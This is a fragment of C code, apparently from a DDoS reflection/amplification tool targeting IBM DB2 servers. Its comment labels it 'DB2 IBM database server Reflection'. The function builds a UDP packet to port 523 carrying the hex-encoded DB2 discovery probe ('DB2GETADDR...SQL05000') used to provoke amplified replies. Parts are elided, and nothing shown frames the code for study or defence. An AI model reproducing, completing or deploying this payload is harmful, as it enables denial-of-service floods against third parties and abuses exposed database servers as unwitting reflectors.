/* DB2 IBM database server Reflection :: */
...
void setup_udp_header(struct udphdr *udph)
{
	...
	udph->dest = htons(523);
	udph->check = 0;
	memcpy((void *)udph + sizeof(struct udphdr), "\x44\x42\x32\x47\x45\x54\x41\x44\x44\x52\x00\x53\x51\x4c\x30\x35\x30\x30\x30\x00", 20);
